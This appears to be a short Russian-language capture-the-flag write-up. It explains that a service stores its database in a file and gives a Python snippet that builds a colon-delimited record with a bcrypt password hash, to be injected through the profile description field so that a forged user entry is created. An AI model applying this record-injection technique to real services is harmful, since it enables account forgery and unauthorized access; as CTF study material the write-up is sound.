Смотрим исходники, видим что база данных хранится в файле

Придумываем инъекцию в description (register_profile и потом login_profile)

```python
import random
import string
from passlib.context import CryptContext
inj_usernameandpassword = ''.join(random.choice(string.ascii_lowercase) for _ in range(11))
inj_passhash = CryptContext(schemes=["bcrypt"], deprecated="auto").hash(inj_usernameandpassword)
inj_firstandlastname = ''.join(random.choice(string.ascii_lowercase) for _ in range(11))
inj_profile_id = 'e44341f22af741240fea9c98277e1430'
inj_desc = 'e44341f22af741240fea9c98277e1430'
print(f"{inj_firstandlastname}:{inj_firstandlastname}:{inj_usernameandpassword}:{inj_passhash}:{inj_profile_id}:{inj_desc}")
```


